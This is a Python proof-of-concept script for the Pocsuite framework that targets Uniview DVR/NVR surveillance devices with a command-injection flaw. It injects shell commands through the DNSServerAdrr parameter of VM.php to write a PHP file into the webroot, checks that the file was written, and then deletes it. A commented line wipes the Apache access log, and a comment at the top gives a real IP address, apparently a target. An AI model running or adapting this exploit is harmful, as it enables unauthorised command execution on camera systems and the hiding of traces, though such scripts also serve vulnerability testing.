#!/usr/bin/env python
# coding: utf-8

##http://58.117.150.195
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import random
import hashlib
class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['GHOST']
    vulDate = ''
    createDate = '2016-06-21'
    updateDate = '2016-06-21'
    references = ['http://www.seebug.org/vuldb/ssvid-']
    name = ''
    appPowerLink = ''
    appName = 'DVR/NVR'
    appVersion = ''
    vulType = '命令执行'
    desc = '''
    浙江宇视科技安防(DVR/NVR)等监控设备命令执行
    '''
    samples = ['']
    install_requires = ['']
    #请尽量不要使用第三方库，必要时参考 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md#poc-第三方模块依赖说明 填写该字段

    def _attack(self):
        result = {}

        return self._verify()

    def _verify(self):
        result = {}
        try:
            file_name=str(random.randint(0,100000))
            random_num=hashlib.md5(file_name).hexdigest()
            write=str(random_num)
            payload='/Interface/DevManage/VM.php?cmd=setDNSServer&DNSServerAdrr=" | echo {} >/usr/local/program/ecrwww/apache/htdocs/Interface/DevManage/{}.php %23"'.format(write,file_name)
            url=self.url+payload
            response=req.get(url)
            print response.content
            if 'success'in response.content  :
                v_url='/Interface/DevManage/{}.php'.format(file_name)
                res=req.get(self.url+v_url)
                print res.content
                if write in res.content:
                    print('success write')
                    result['VerifyInfo']={}
                    result['VerifyInfo']['Url']=url
                    #rm -f /var/log/httpd/access.log
                    payload_del='/Interface/DevManage/VM.php?cmd=setDNSServer&DNSServerAdrr=" | rm -f /usr/local/program/ecrwww/apache/htdocs/Interface/DevManage/{}.php %23"'.format(file_name)
                    req.get(self.url+payload_del)
                    r=req.get(v_url)
                else:
                    print 'get fail'
            else:
                print 'write fail'
        except Exception as e:
            print e
            pass


        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)